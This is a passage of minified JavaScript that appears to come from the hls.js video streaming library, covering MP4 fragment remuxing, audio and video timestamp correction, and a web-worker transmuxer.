"+g),this.logEnabled=!1)},l}()},function(wa,Va,Na){function Oa(){return(Oa=Object.assign||function(D){for(var I=1;I<arguments.length;I++){var G,L=arguments[I];for(G in L)Object.prototype.hasOwnProperty.call(L,G)&&(D[G]=L[G])}return D}).apply(this,arguments)}function u(D,I){var L;if(null===I)return D;for(L=I<D?-8589934592:8589934592;4294967296<Math.abs(D-I);)D+=L;return D}Na.d(Va,"a",(function(){return z})),Na.d(Va,"b",(function(){return u}));var da=Na(3),M=function(){function D(){}return D.getSilentFrame=function(I,L){if("mp4a.40.2"===I){if(1===L)return new Uint8Array([0,200,0,128,35,128]);if(2===L)return new Uint8Array([33,0,73,144,2,25,0,35,128]);if(3===L)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,142]);if(4===L)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,128,44,128,8,2,56]);if(5===L)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,56]);if(6===L)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,0,178,0,32,8,224])}else{if(1===L)return new Uint8Array([1,64,34,128,163,78,230,128,186,8,0,0,0,28,6,241,193,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(2===L||3===L)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94])}},D}(),v=Math.pow(2,32)-1,m=function(){function D(){}return D.init=function(){for(var I in D.types={avc1:[],avcC:[],btrt:[],dinf:[],dref:[],esds:[],ftyp:[],hdlr:[],mdat:[],mdhd:[],mdia:[],mfhd:[],minf:[],moof:[],moov:[],mp4a:[],".mp3":[],mvex:[],mvhd:[],pasp:[],sdtp:[],stbl:[],stco:[],stsc:[],stsd:[],stsz:[],stts:[],tfdt:[],tfhd:[],traf:[],trak:[],trun:[],trex:[],tkhd:[],vmhd:[],smhd:[]},D.types)D.types.hasOwnProperty(I)&&(D.types[I]=[I.charCodeAt(0),I.charCodeAt(1),I.charCodeAt(2),I.charCodeAt(3)]);I=new Uint8Array([0,0,0,0,0,0,0,0,118,105,100,101,0,0,0,0,0,0,0,0,0,0,0,0,86,105,100,101,111,72,97,110,100,108,101,114,0]);var L=new Uint8Array([0,0,0,0,0,0,0,0,115,111,117,110,0,0,0,0,0,0,0,0,0,0,0,0,83,111,117,110,100,72,97,110,100,108,101,114,0]);D.HDLR_TYPES={video:I,audio:L},I=new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,12,117,114,108,32,0,0,0,1]),L=new Uint8Array([0,0,0,0,0,0,0,0]),D.STTS=D.STSC=D.STCO=L,D.STSZ=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0]),D.VMHD=new Uint8Array([0,0,0,1,0,0,0,0,0,0,0,0]),D.SMHD=new Uint8Array([0,0,0,0,0,0,0,0]),D.STSD=new Uint8Array([0,0,0,0,0,0,0,1]),L=new Uint8Array([105,115,111,109]);var G=new Uint8Array([97,118,99,49]),N=new Uint8Array([0,0,0,1]);D.FTYP=D.box(D.types.ftyp,L,N,L,G),D.DINF=D.box(D.types.dinf,D.box(D.types.dref,I))},D.box=function(I){for(var L=8,G=arguments.length,N=Array(1<G?G-1:0),w=1;w<G;w++)N[w-1]=arguments[w];for(w=G=N.length;G--;)L+=N[G].byteLength;var h=new Uint8Array(L);for(h[0]=L>>24&255,h[1]=L>>16&255,h[2]=L>>8&255,h[3]=255&L,h.set(I,4),G=0,L=8;G<w;G++)h.set(N[G],L),L+=N[G].byteLength;return h},D.hdlr=function(I){return D.box(D.types.hdlr,D.HDLR_TYPES[I])},D.mdat=function(I){return D.box(D.types.mdat,I)},D.mdhd=function(I,L){L*=I;var G=Math.floor(L/(v+1));return L=Math.floor(L%(v+1)),D.box(D.types.mdhd,new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,I>>24&255,I>>16&255,I>>8&255,255&I,G>>24,G>>16&255,G>>8&255,255&G,L>>24,L>>16&255,L>>8&255,255&L,85,196,0,0]))},D.mdia=function(I){return D.box(D.types.mdia,D.mdhd(I.timescale,I.duration),D.hdlr(I.type),D.minf(I))},D.mfhd=function(I){return D.box(D.types.mfhd,new Uint8Array([0,0,0,0,I>>24,I>>16&255,I>>8&255,255&I]))},D.minf=function(I){return"audio"===I.type?D.box(D.types.minf,D.box(D.types.smhd,D.SMHD),D.DINF,D.stbl(I)):D.box(D.types.minf,D.box(D.types.vmhd,D.VMHD),D.DINF,D.stbl(I))},D.moof=function(I,L,G){return D.box(D.types.moof,D.mfhd(I),D.traf(G,L))},D.moov=function(I){for(var L=I.length,G=[];L--;)G[L]=D.trak(I[L]);return D.box.apply(null,[D.types.moov,D.mvhd(I[0].timescale,I[0].duration)].concat(G).concat(D.mvex(I)))},D.mvex=function(I){for(var L=I.length,G=[];L--;)G[L]=D.trex(I[L]);return D.box.apply(null,[D.types.mvex].concat(G))},D.mvhd=function(I,L){L*=I;var G=Math.floor(L/(v+1));return L=Math.floor(L%(v+1)),I=new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,I>>24&255,I>>16&255,I>>8&255,255&I,G>>24,G>>16&255,G>>8&255,255&G,L>>24,L>>16&255,L>>8&255,255&L,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255]),D.box(D.types.mvhd,I)},D.sdtp=function(I){var L=I.samples||[],G=new Uint8Array(4+L.length);for(I=0;I<L.length;I++){var N=L[I].flags;G[I+4]=N.dependsOn<<4|N.isDependedOn<<2|N.hasRedundancy}return D.box(D.types.sdtp,G)},D.stbl=function(I){return D.box(D.types.stbl,D.stsd(I),D.box(D.types.stts,D.STTS),D.box(D.types.stsc,D.STSC),D.box(D.types.stsz,D.STSZ),D.box(D.types.stco,D.STCO))},D.avc1=function(I){var L,G,N=[],w=[];for(L=0;L<I.sps.length;L++){var h=(G=I.sps[L]).byteLength;N.push(h>>>8&255),N.push(255&h),N=N.concat(Array.prototype.slice.call(G))}for(L=0;L<I.pps.length;L++)h=(G=I.pps[L]).byteLength,w.push(h>>>8&255),w.push(255&h),w=w.concat(Array.prototype.slice.call(G));return L=D.box(D.types.avcC,new Uint8Array([1,N[3],N[4],N[5],255,224|I.sps.length].concat(N).concat([I.pps.length]).concat(w))),G=I.width,h=I.height,N=I.pixelRatio[0],I=I.pixelRatio[1],D.box(D.types.avc1,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,G>>8&255,255&G,h>>8&255,255&h,0,72,0,0,0,72,0,0,0,0,0,0,0,1,18,100,97,105,108,121,109,111,116,105,111,110,47,104,108,115,46,106,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,17,17]),L,D.box(D.types.btrt,new Uint8Array([0,28,156,128,0,45,198,192,0,45,198,192])),D.box(D.types.pasp,new Uint8Array([N>>24,N>>16&255,N>>8&255,255&N,I>>24,I>>16&255,I>>8&255,255&I])))},D.esds=function(I){var L=I.config.length;return new Uint8Array([0,0,0,0,3,23+L,0,1,0,4,15+L,64,21,0,0,0,0,0,0,0,0,0,0,0,5].concat([L]).concat(I.config).concat([6,1,2]))},D.mp4a=function(I){var L=I.samplerate;return D.box(D.types.mp4a,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,I.channelCount,0,16,0,0,0,0,L>>8&255,255&L,0,0]),D.box(D.types.esds,D.esds(I)))},D.mp3=function(I){var L=I.samplerate;return D.box(D.types[".mp3"],new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,I.channelCount,0,16,0,0,0,0,L>>8&255,255&L,0,0]))},D.stsd=function(I){return"audio"===I.type?I.isAAC||"mp3"!==I.codec?D.box(D.types.stsd,D.STSD,D.mp4a(I)):D.box(D.types.stsd,D.STSD,D.mp3(I)):D.box(D.types.stsd,D.STSD,D.avc1(I))},D.tkhd=function(I){var L=I.id,G=I.duration*I.timescale,N=I.width;I=I.height;var w=Math.floor(G/(v+1));return G=Math.floor(G%(v+1)),D.box(D.types.tkhd,new Uint8Array([1,0,0,7,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,L>>24&255,L>>16&255,L>>8&255,255&L,0,0,0,0,w>>24,w>>16&255,w>>8&255,255&w,G>>24,G>>16&255,G>>8&255,255&G,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,N>>8&255,255&N,0,0,I>>8&255,255&I,0,0]))},D.traf=function(I,L){var G=D.sdtp(I),N=I.id,w=Math.floor(L/(v+1));return L=Math.floor(L%(v+1)),D.box(D.types.traf,D.box(D.types.tfhd,new Uint8Array([0,0,0,0,N>>24,N>>16&255,N>>8&255,255&N])),D.box(D.types.tfdt,new Uint8Array([1,0,0,0,w>>24,w>>16&255,w>>8&255,255&w,L>>24,L>>16&255,L>>8&255,255&L])),D.trun(I,G.length+16+20+8+16+8+8),G)},D.trak=function(I){return I.duration=I.duration||4294967295,D.box(D.types.trak,D.tkhd(I),D.mdia(I))},D.trex=function(I){return I=I.id,D.box(D.types.trex,new Uint8Array([0,0,0,0,I>>24,I>>16&255,I>>8&255,255&I,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1]))},D.trun=function(I,L){var G,N=(I=I.samples||[]).length,w=12+16*N,h=new Uint8Array(w);for(L+=8+w,h.set([0,0,15,1,N>>>24&255,N>>>16&255,N>>>8&255,255&N,L>>>24&255,L>>>16&255,L>>>8&255,255&L],0),L=0;L<N;L++){w=(G=I[L]).duration;var F=G.size,P=G.flags;G=G.cts,h.set([w>>>24&255,w>>>16&255,w>>>8&255,255&w,F>>>24&255,F>>>16&255,F>>>8&255,255&F,P.isLeading<<2|P.dependsOn,P.isDependedOn<<6|P.hasRedundancy<<4|P.paddingValue<<1|P.isNonSync,61440&P.degradPrio,15&P.degradPrio,G>>>24&255,G>>>16&255,G>>>8&255,255&G],12+16*L)}return D.box(D.types.trun,h)},D.initSegment=function(I){D.types||D.init(),I=D.moov(I);var L=new Uint8Array(D.FTYP.byteLength+I.byteLength);return L.set(D.FTYP),L.set(I,D.FTYP.byteLength),L},D}();m.types=void 0,m.HDLR_TYPES=void 0,m.STTS=void 0,m.STSC=void 0,m.STCO=void 0,m.STSZ=void 0,m.VMHD=void 0,m.SMHD=void 0,m.STSD=void 0,m.FTYP=void 0,m.DINF=void 0;var p=Na(0),l=Na(2),f=Na(1),g=Na(7),t=null,r=null,x=!1,z=function(){function D(L,G,N,w){this._initPTS=void 0,this._initDTS=void 0,this.nextAvcDts=null,this.nextAudioPts=null,this.isAudioContiguous=!1,this.isVideoContiguous=!1,this.observer=L,this.config=G,this.typeSupported=N,this.ISGenerated=!1,null===t&&(t=(L=(navigator.userAgent||"").match(/Chrome\/(\d+)/i))?parseInt(L[1]):0),null===r&&(r=(L=navigator.userAgent.match(/Safari\/(\d+)/i))?parseInt(L[1]):0),x=!!t&&75>t||!!r&&600>r}var I=D.prototype;return I.destroy=function(){},I.resetTimeStamp=function(L){f.b.log("[mp4-remuxer]: initPTS & initDTS reset"),this._initPTS=this._initDTS=L},I.resetNextTimestamp=function(){f.b.log("[mp4-remuxer]: reset next timestamp"),this.isAudioContiguous=this.isVideoContiguous=!1},I.resetInitSegment=function(){f.b.log("[mp4-remuxer]: ISGenerated flag reset"),this.ISGenerated=!1},I.getVideoStartPts=function(L){var G=!1;return L=L.reduce((function(N,w){var h=w.pts-N;return-4294967296>h?(G=!0,u(N,w.pts)):0<h?N:w.pts}),L[0].pts),G&&f.b.debug("PTS rollover detected"),L},I.remux=function(L,G,N,w,h,F,P){var O,R,Q,ja,W=h,aa=h,ma=-1<G.pid,H=0<L.samples.length,B=1<G.samples.length;if(!(-1<L.pid&&!H||ma&&!B)||this.ISGenerated||P){if(this.ISGenerated||(R=this.generateIS(L,G,h)),P=this.isVideoContiguous,B&&!P&&this.config.forceKeyFrameOnDiscontinuity){var A;ma=G.samples.length;a:{var Y=G.samples;for(A=0;A<Y.length;A++)if(Y[A].key)break a;A=-1}Y=!0,0<A?(f.b.warn("[mp4-remuxer]: Dropped "+A+" out of "+ma+" video samples due to a missing keyframe"),ma=this.getVideoStartPts(G.samples),G.samples=G.samples.slice(A),G.dropped+=A,aa+=(G.samples[0].pts-ma)/(G.timescale||9e4)):-1===A&&(f.b.warn("[mp4-remuxer]: No keyframe found out of "+ma+" video samples"),Y=!1)}if(this.ISGenerated){if(H&&B&&(ma=this.getVideoStartPts(G.samples),ma=(u(L.samples[0].pts,ma)-ma)/G.inputTimeScale,W+=Math.max(0,ma),aa+=Math.max(0,-ma)),H){if(L.samplerate||(f.b.warn("[mp4-remuxer]: regenerate InitSegment as audio detected"),delete(R=this.generateIS(L,G,h)).video),O=this.remuxAudio(L,W,this.isAudioContiguous,F,B?aa:void 0),B){F=O?O.endPTS-O.startPTS:0,G.inputTimeScale||(f.b.warn("[mp4-remuxer]: regenerate InitSegment as video detected"),R=this.generateIS(L,G,h));var Z=this.remuxVideo(G,aa,P,F)}}else B&&(Z=this.remuxVideo(G,aa,P,0));Z&&void 0!==Y&&(Z.independent=Y)}}return this.ISGenerated&&(N.samples.length&&(ja=this.remuxID3(N,h)),w.samples.length&&(Q=this.remuxText(w,h))),{audio:O,video:Z,initSegment:R,independent:Y,text:Q,id3:ja}},I.generateIS=function(L,G,N){var w,h,F,P=L.samples,O=G.samples,R=this.typeSupported,Q={},ja=!Object(da.a)(this._initPTS),W="audio/mp4";if(ja&&(w=h=1/0),L.config&&P.length&&(L.timescale=L.samplerate,L.isAAC||(R.mpeg?(W="audio/mpeg",L.codec=""):R.mp3&&(L.codec="mp3")),Q.audio={id:"audio",container:W,codec:L.codec,initSegment:!L.isAAC&&R.mpeg?new Uint8Array(0):m.initSegment([L]),metadata:{channelCount:L.channelCount}},ja&&(F=L.inputTimeScale,w=h=P[0].pts-Math.round(F*N))),G.sps&&G.pps&&O.length&&(G.timescale=G.inputTimeScale,Q.video={id:"main",container:"video/mp4",codec:G.codec,initSegment:m.initSegment([G]),metadata:{width:G.width,height:G.height}},ja)&&(F=G.inputTimeScale,L=this.getVideoStartPts(O),N=Math.round(F*N),h=Math.min(h,u(O[0].dts,L)-N),w=Math.min(w,L-N)),Object.keys(Q).length)return this.ISGenerated=!0,ja&&(this._initPTS=w,this._initDTS=h),{tracks:Q,initPTS:w,timescale:F}},I.remuxVideo=function(L,G,N,w){var h=L.inputTimeScale,F=L.samples,P=[],O=F.length,R=this._initPTS,Q=this.nextAvcDts,ja=8,W=Number.POSITIVE_INFINITY,aa=Number.NEGATIVE_INFINITY,ma=0,H=!1;for(N&&null!==Q||(Q=G*h-(F[0].pts-u(F[0].dts,F[0].pts))),G=0;G<O;G++){var B=F[G];B.pts=u(B.pts-R,Q),B.dts=u(B.dts-R,Q),B.dts>B.pts&&(ma=Math.max(Math.min(ma,B.pts-B.dts),-18e3)),B.dts<F[0<G?G-1:G].dts&&(H=!0)}if(H&&F.sort((function(ia,S){var V=ia.pts-S.pts;return ia.dts-S.dts||V})),R=F[0].dts,H=F[F.length-1].dts,H=Math.round((H-R)/(O-1)),0>ma){if(ma<-2*H)for(f.b.warn("PTS < DTS detected in video samples, offsetting DTS from PTS by "+Object(g.b)(-H,!0)+" ms"),R=ma,ma=0;ma<O;ma++)F[ma].dts=R=Math.max(R,F[ma].pts-H),F[ma].pts=Math.max(R,F[ma].pts);else for(f.b.warn("PTS < DTS detected in video samples, shifting DTS by "+Object(g.b)(ma,!0)+" ms to overcome this issue"),R=0;R<O;R++)F[R].dts+=ma;R=F[0].dts}for(N&&((H=(N=R-Q)>H)||-1>N)&&(H?f.b.warn("AVC: "+Object(g.b)(N,!0)+" ms ("+N+"dts) hole between fragments detected, filling it"):f.b.warn("AVC: "+Object(g.b)(-N,!0)+" ms ("+N+"dts) overlapping between fragments detected"),R=Q,H=F[0].pts-N,F[0].dts=R,F[0].pts=H,f.b.log("Video: First PTS/DTS adjusted: "+Object(g.b)(H,!0)+"/"+Object(g.b)(R,!0)+", delta: "+Object(g.b)(N,!0)+" ms")),x&&(R=Math.max(0,R)),H=N=Q=0;H<O;H++){B=(G=(ma=F[H]).units).length;for(var A=0,Y=0;Y<B;Y++)A+=G[Y].data.length;N+=A,Q+=B,ma.length=A,ma.dts=Math.max(ma.dts,R),ma.pts=Math.max(ma.pts,ma.dts,0),W=Math.min(ma.pts,W),aa=Math.max(ma.pts,aa)}H=F[O-1].dts,N=N+4*Q+8;try{var Z=new Uint8Array(N)}catch(ia){return void this.observer.emit(p.a.ERROR,p.a.ERROR,{type:l.b.MUX_ERROR,details:l.a.REMUX_ALLOC_ERROR,fatal:!1,bytes:N,reason:"fail allocating video mdat "+N})}for((Q=new DataView(Z.buffer)).setUint32(0,N),Z.set(m.types.mdat,4),N=0;N<O;N++){for(A=G=0,Y=(B=(ma=F[N]).units).length;A<Y;A++){var na=B[A],T=na.data;na=na.data.byteLength,Q.setUint32(ja,na),ja+=4,Z.set(T,ja),ja+=na,G+=4+na}if(N<O-1)var pa=F[N+1].dts-ma.dts;else B=this.config,A=ma.dts-F[0<N?N-1:N].dts,B.stretchShortVideoTrack&&null!==this.nextAudioPts&&(Y=(w?W+w*h:this.nextAudioPts)-ma.pts)>Math.floor(B.maxBufferHole*h)?(0>(pa=Y-A)&&(pa=A),f.b.log("[mp4-remuxer]: It is approximately "+Y/90+" ms to the next segment; using duration "+pa/90+" ms for the last video frame.")):pa=A;P.push(new J(ma.key,pa,G,Math.round(ma.pts-ma.dts)))}return P.length&&t&&70>t&&((w=P[0].flags).dependsOn=2,w.isNonSync=0),this.nextAvcDts=Q=H+pa,this.isVideoContiguous=!0,pa={data1:m.moof(L.sequenceNumber++,R,Oa({},L,{samples:P})),data2:Z,startPTS:W/h,endPTS:(aa+pa)/h,startDTS:R/h,endDTS:Q/h,type:"video",hasAudio:!1,hasVideo:!0,nb:P.length,dropped:L.dropped},L.samples=[],L.dropped=0,pa},I.remuxAudio=function(L,G,N,w,h){var F,P=L.inputTimeScale,O=P/(L.samplerate?L.samplerate:P),R=L.isAAC?1024:1152,Q=R*O,ja=this._initPTS,W=!L.isAAC&&this.typeSupported.mpeg,aa=[],ma=L.samples,H=W?0:8,B=this.nextAudioPts||-1,A=G*P;if(this.isAudioContiguous=N=N||ma.length&&0<B&&(w&&9e3>Math.abs(A-B)||Math.abs(u(ma[0].pts-ja,A)-B)<20*Q),ma.forEach((function(V){V.pts=V.dts=u(V.pts-ja,A)})),!N||0>B){if(!(ma=ma.filter((function(V){return 0<=V.pts}))).length)return;B=0===h?0:w?Math.max(0,A):ma[0].pts}if(L.isAAC){G=this.config.maxAudioFramesDrift,w=0;for(var Y=B;w<ma.length;){var Z=ma[w],na=Z.pts,T=na-Y,pa=Math.abs(1e3*T/P);if(T<=-G*Q&&void 0!==h)N||0<w?(f.b.warn("[mp4-remuxer]: Dropping 1 audio frame @ "+(Y/P).toFixed(3)+"s due to "+Math.round(pa)+" ms overlap."),ma.splice(w,1)):(f.b.warn("Audio frame @ "+(na/P).toFixed(3)+"s overlaps nextAudioPts by "+Math.round(1e3*T/P)+" ms."),Y=na+Q,w++);else{if(T>=G*Q&&1e4>pa&&void 0!==h)for(Y=na-(pa=Math.floor(T/Q))*Q,f.b.warn("[mp4-remuxer]: Injecting "+pa+" audio frame @ "+(Y/P).toFixed(3)+"s due to "+Math.round(1e3*T/P)+" ms gap."),na=0;na<pa;na++)T=Math.max(Y,0),(F=M.getSilentFrame(L.manifestCodec||L.codec,L.channelCount))||(f.b.log("[mp4-remuxer]: Unable to get silent frame for given audio codec; duplicating last frame instead."),F=Z.unit.subarray()),ma.splice(w,0,{unit:F,pts:T,dts:T}),Y+=Q,w++;Z.pts=Z.dts=Y,Y+=Q,w++}}}for(w=h=null,G=0,Y=ma.length;Y--;)G+=ma[Y].unit.byteLength;for(Y=0,Z=ma.length;Y<Z;Y++){if(pa=(na=ma[Y]).unit,na=na.pts,null!==w)aa[Y-1].duration=Math.round((na-w)/O);else{var ia=Math.round(1e3*(na-B)/P);if(T=0,N&&L.isAAC){if(0<ia&&1e4>ia)T=Math.round((na-B)/Q),f.b.log("[mp4-remuxer]: "+ia+" ms hole between AAC samples detected,filling it"),0<T&&((F=M.getSilentFrame(L.manifestCodec||L.codec,L.channelCount))||(F=pa.subarray()),G+=T*F.length);else if(-12>ia){f.b.log("[mp4-remuxer]: drop overlapping AAC sample, expected/parsed/delta:"+(B/P).toFixed(3)+"s/"+(na/P).toFixed(3)+"s/"+-ia+"ms"),G-=pa.byteLength;continue}na=B}if(h=na,!(0<G))return;G+=H;try{var S=new Uint8Array(G)}catch(V){return void this.observer.emit(p.a.ERROR,p.a.ERROR,{type:l.b.MUX_ERROR,details:l.a.REMUX_ALLOC_ERROR,fatal:!1,bytes:G,reason:"fail allocating audio mdat "+G})}for(W||(new DataView(S.buffer).setUint32(0,G),S.set(m.types.mdat,4)),w=0;w<T;w++)(F=M.getSilentFrame(L.manifestCodec||L.codec,L.channelCount))||(f.b.log("[mp4-remuxer]: Unable to get silent frame for given audio codec; duplicating the current frame instead"),F=pa.subarray()),S.set(F,H),H+=F.byteLength,aa.push(new J(!0,1024,F.byteLength,0))}S.set(pa,H),H+=w=pa.byteLength,aa.push(new J(!0,R,w,0)),w=na}if(N=aa.length)return this.nextAudioPts=B=w+O*aa[aa.length-1].duration,O=W?new Uint8Array(0):m.moof(L.sequenceNumber++,h/O,Oa({},L,{samples:aa})),L.samples=[],S={data1:O,data2:S,startPTS:L=h/P,endPTS:P=B/P,startDTS:L,endDTS:P,type:"audio",hasAudio:!0,hasVideo:!1,nb:N},this.isAudioContiguous=!0,S},I.remuxEmptyAudio=function(L,G,N,w){var h=L.inputTimeScale,F=this.nextAudioPts;F=(null!==F?F:w.startDTS*h)+this._initDTS;var P=h/(L.samplerate?L.samplerate:h)*1024;if(w=Math.ceil((w.endDTS*h+this._initDTS-F)/P),h=M.getSilentFrame(L.manifestCodec||L.codec,L.channelCount),f.b.warn("[mp4-remuxer]: remux empty Audio"),h){for(var O=[],R=0;R<w;R++){var Q=F+R*P;O.push({unit:h,pts:Q,dts:Q})}return L.samples=O,this.remuxAudio(L,G,N,!1)}f.b.trace("[mp4-remuxer]: Unable to remuxEmptyAudio since we were unable to get a silent frame for given audio codec")},I.remuxID3=function(L,G){var N=L.samples.length;if(N){for(var w=L.inputTimeScale,h=this._initPTS,F=this._initDTS,P=0;P<N;P++){var O=L.samples[P];O.pts=u(O.pts-h,G*w)/w,O.dts=u(O.dts-F,G*w)/w}return G=L.samples,L.samples=[],{samples:G}}},I.remuxText=function(L,G){var N=L.samples.length;if(N){for(var w=L.inputTimeScale,h=this._initPTS,F=0;F<N;F++){var P=L.samples[F];P.pts=u(P.pts-h,G*w)/w}return L.samples.sort((function(O,R){return O.pts-R.pts})),G=L.samples,L.samples=[],{samples:G}}},D}(),J=function(D,I,L,G){this.flags=this.cts=this.duration=this.size=void 0,this.duration=I,this.size=L,this.cts=G,this.flags=new E(D)},E=function(D){this.degradPrio=this.hasRedundancy=this.isDependedOn=this.isLeading=0,this.isNonSync=this.dependsOn=1,this.dependsOn=D?2:1,this.isNonSync=D?0:1}},function(wa,Va,Na){Na.d(Va,"a",(function(){return da}));var u=Na(10),da=function(){function M(m,p){this.iv=this.key=this.keyID=this.keyFormatVersions=this.keyFormat=this.method=this._uri=null,this._uri=p?Object(u.buildAbsoluteURL)(m,p,{alwaysNormalize:!0}):m}var v;return M.fromURL=function(m,p){return new M(m,p)},M.fromURI=function(m){return new M(m)},v=[{key:"uri",get:function(){return this._uri}}],function Oa(M,v){for(var m=0;m<v.length;m++){var p=v[m];p.enumerable=p.enumerable||!1,p.configurable=!0,"value"in p&&(p.writable=!0),Object.defineProperty(M,p.key,p)}}(M.prototype,v),M}()},function(wa,Va,Na){function Oa(M){function v(l){if(m[l])return m[l].exports;var f=m[l]={i:l,l:!1,exports:{}};return M[l].call(f.exports,f,f.exports,v),f.l=!0,f.exports}var m={};v.m=M,v.c=m,v.i=function(l){return l},v.d=function(l,f,g){v.o(l,f)||Object.defineProperty(l,f,{configurable:!1,enumerable:!0,get:g})},v.r=function(l){Object.defineProperty(l,"__esModule",{value:!0})},v.n=function(l){var f=l&&l.__esModule?function(){return l.default}:function(){return l};return v.d(f,"a",f),f},v.o=function(l,f){return Object.prototype.hasOwnProperty.call(l,f)},v.p="/",v.oe=function(l){throw console.error(l),l};var p=v(v.s=ENTRY_MODULE);return p.default||p}function u(M){return(M+"").replace(/[.?*+^$[\]\\(){}|-]/g,"\\$&")}function da(M){return Object.keys(M).reduce((function(v,m){return v||0<M[m].length}),!1)}wa.exports=function(M,v){v=v||{};var m={main:Na.m},p=v.all?{main:Object.keys(m.main)}:function(f,g){g={main:[g]};for(var t={main:[]},r={main:{}};da(g);)for(var x=Object.keys(g),z=0;z<x.length;z++){var J=x[z],E=g[J].pop();if(r[J]=r[J]||{},!r[J][E]&&f[J][E]){var D;r[J][E]=!0,t[J]=t[J]||[],t[J].push(E);var I=f,L=f[J][E];if(E=J,(J={})[E]=[],D=(L=L.toString()).match(/^function\s?\w*\(\w+,\s*\w+,\s*(\w+)\)/)){for(var G=D[1],N=new RegExp("(\\\\n|\\W)"+u(G)+"\\(\\s*(/\\*.*?\\*/)?\\s*.*?([\\.|\\-|\\+|\\w|/|@]+).*?\\)","g");D=N.exec(L);)"dll-reference"!==D[3]&&J[E].push(D[3]);for(N=new RegExp("\\("+u(G)+'\\("(dll-reference\\s([\\.|\\-|\\+|\\w|/|@]+))"\\)\\)\\(\\s*(/\\*.*?\\*/)?\\s*.*?([\\.|\\-|\\+|\\w|/|@]+).*?\\)',"g");D=N.exec(L);)I[D[2]]||(J[E].push(D[1]),I[D[2]]=Na(D[1]).m),J[D[2]]=J[D[2]]||[],J[D[2]].push(D[4]);for(E=Object.keys(J),L=0;L<E.length;L++)for(D=0;D<J[E[L]].length;D++)I=J[E[L]][D],isNaN(1*I)||(J[E[L]][D]*=1)}for(I=Object.keys(J),E=0;E<I.length;E++)g[I[E]]=g[I[E]]||[],g[I[E]]=g[I[E]].concat(J[I[E]])}}return t}(m,M),l="";return Object.keys(p).filter((function(f){return"main"!==f})).forEach((function(f){for(var g=0;p[f][g];)g++;p[f].push(g),m[f][g]="(function(module, exports, __webpack_require__) { module.exports = __webpack_require__; })",l=l+"var "+f+" = ("+Oa.toString().replace("ENTRY_MODULE",JSON.stringify(g))+")({"+p[f].map((function(t){return JSON.stringify(t)+": "+m[f][t].toString()})).join(",")+"});\n"})),l=l+"new (("+Oa.toString().replace("ENTRY_MODULE",JSON.stringify(M))+")({"+p.main.map((function(f){return JSON.stringify(f)+": "+m.main[f].toString()})).join(",")+"}))(self);",M=new sb.Blob([l],{type:"text/javascript"}),v.bare||(v=(sb.URL||sb.webkitURL||sb.mozURL||sb.msURL).createObjectURL(M),(M=new sb.Worker(v)).objectURL=v),M}},function(wa,Va,Na){function Oa(f){var g=new l.EventEmitter,t=function(r,x){f.postMessage({event:r,data:x})};g.on(m.a.FRAG_DECRYPTED,t),g.on(m.a.ERROR,t),f.addEventListener("message",(function(r){switch((r=r.data).cmd){case"init":var x=JSON.parse(r.config);f.transmuxer=new v.c(g,r.typeSupported,x,r.vendor),Object(p.a)(x.debug),t("init",null);break;case"configure":f.transmuxer.configure(r.config);break;case"demux":r=f.transmuxer.push(r.data,r.decryptdata,r.chunkMeta,r.state),Object(v.d)(r)?r.then((function(J){u(f,J)})):u(f,r);break;case"flush":var z=r.chunkMeta;r=f.transmuxer.flush(z),Object(v.d)(r)?r.then((function(J){M(f,J,z)})):M(f,r,z)}}))}function u(f,g){if((t=g.remuxResult).audio||t.video||t.text||t.id3||t.initSegment){var t;t=[];var r=g.remuxResult,x=r.audio;r=r.video,x&&da(t,x),r&&da(t,r),f.postMessage({event:"transmuxComplete",data:g},t)}}function da(f,g){g.data1&&f.push(g.data1.buffer),g.data2&&f.push(g.data2.buffer)}function M(f,g,t){g.forEach((function(r){u(f,r)})),f.postMessage({event:"flush",data:t})}Na.r(Va),Na.d(Va,"default",(function(){return Oa}));var v=Na(9),m=Na(0),p=Na(1),l=Na(13)},function(wa,Va,Na){function u(ta,ca){return MediaSource.isTypeSupported((ca||"video")+'/mp4;codecs="'+ta+'"')}function da(ta,ca){["video","audio","text"].forEach((function(n){var k=ta.filter((function(y){var K=Qb[n];return!!K&&!0===K[y.slice(0,4)]}));if(k.length){var e=k.filter((function(y){return 0===y.lastIndexOf("avc1",0)||0===y.lastIndexOf("mp4a",0)}));ca[n+"Codec"]=0<e.length?e[0]:k[0],ta=ta.filter((function(y){return-1===k.indexOf(y)}))}})),ca.unknownCodecs=ta}function M(ta,ca){ta.rawProgramDateTime?ta.programDateTime=Date.parse(ta.rawProgramDateTime):null!=ca&&ca.programDateTime&&(ta.programDateTime=ca.endProgramDateTime),Object($a.a)(ta.programDateTime)||(ta.programDateTime=null,ta.rawProgramDateTime=null)}function v(ta,ca){return void 